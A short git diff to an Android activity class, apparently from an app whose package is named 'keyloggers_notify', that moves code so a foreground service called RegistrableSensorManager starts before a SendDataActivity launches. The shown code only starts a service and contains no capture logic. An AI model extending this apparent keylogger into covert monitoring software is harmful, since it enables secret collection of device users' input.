@@ -18,6 +18,13 @@ public class EmptyActivity extends AppCompatActivity {
         } else {
             runService();
         }
+    }
+
+    private void runService() {
+        Intent i = new Intent(this, RegistrableSensorManager.class);
+        i.setAction("com.example.halac.keyloggers_notify.action.startforeground");
+        startService(i);
+
         if (new DatabaseHelper(this).getUser() != null) {
             Intent aa = new Intent(this, SendDataActivity.class);
             aa.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -29,12 +36,6 @@ public class EmptyActivity extends AppCompatActivity {
             startActivity(bb);
 
         }
-    }
-
-    private void runService() {
-        Intent i = new Intent(this, RegistrableSensorManager.class);
-        i.setAction("com.example.halac.keyloggers_notify.action.startforeground");
-        startService(i);
     }
 
     @Override
